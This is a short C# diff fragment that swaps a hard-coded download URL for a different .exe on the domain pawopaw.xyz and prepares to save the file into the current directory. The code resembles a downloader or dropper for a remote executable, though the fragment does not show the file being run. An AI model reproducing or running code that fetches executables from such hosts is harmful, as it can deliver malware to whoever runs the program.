@@ -49,7 +49,7 @@
               {
                   try
                   {
-                      string url = "http://pawopaw.xyz/roflanius1253/dustt.exe";
+                      string url = "http://pawopaw.xyz/roflanius1253/indee.exe";
                                           string filename = Path.GetFileName(url);
                       string destinationpath = Path.Combine(Directory.GetCurrentDirectory(), filename);
 
